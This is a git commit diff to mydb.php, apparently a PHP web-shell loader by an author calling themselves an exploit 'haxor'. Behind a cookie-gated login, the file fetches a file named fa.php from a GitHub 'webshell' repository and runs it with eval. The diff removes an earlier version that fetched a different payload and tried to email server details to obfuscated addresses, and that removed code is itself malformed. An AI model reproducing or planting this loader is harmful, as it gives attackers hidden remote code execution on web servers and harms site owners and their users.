17fbdc6794c8ae8aea09176e23389575f9d4e180
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-05 23:06:46 +0700

    Update mydb.php

--- mydb.php
+++ mydb.php
@@ -26,28 +26,9 @@ if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
     } else {
         admin_login();
     }
-}
-
-$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<meta name="robots" content="noindex">
-<title>explorer manager</title>
-<style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
-</style>
-</head>'; 
-$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/minnin";
+} 
+$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/fa.php";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
-eval("?>".$result);
-$e=base64_decode("ZXhwbG9pdGtpdGVAZ21haWwuY29tLGJsYWNraGF0MTMzNy5pZEBnbWFpbC5jb20=");
-$contact=base64_decode("bWFsYXlzaWEuc2VuZGVyQGdtYWlsLmNvbQ==");
-$headers="Content-type: text/htmlrn";
-$header="Content-type: text/html; charset=utf-8";
-$subjek="information"
-$h=$_SERVER['HTTP_HOST'];
-$h=$_SERVER['SCRIPT_NAME'];
-$h=$_SERVER['SERVER_NAME'];
-$h=$_SERVER['PHP_SELF'];
-$h=$_SERVER['SERVER_PROTOCOL'];
-mail($contact, $e, $header, "base64_decode" $h, $subjek, $h, $h, $headers, $h);
-?>
+eval("?>".$result);?>
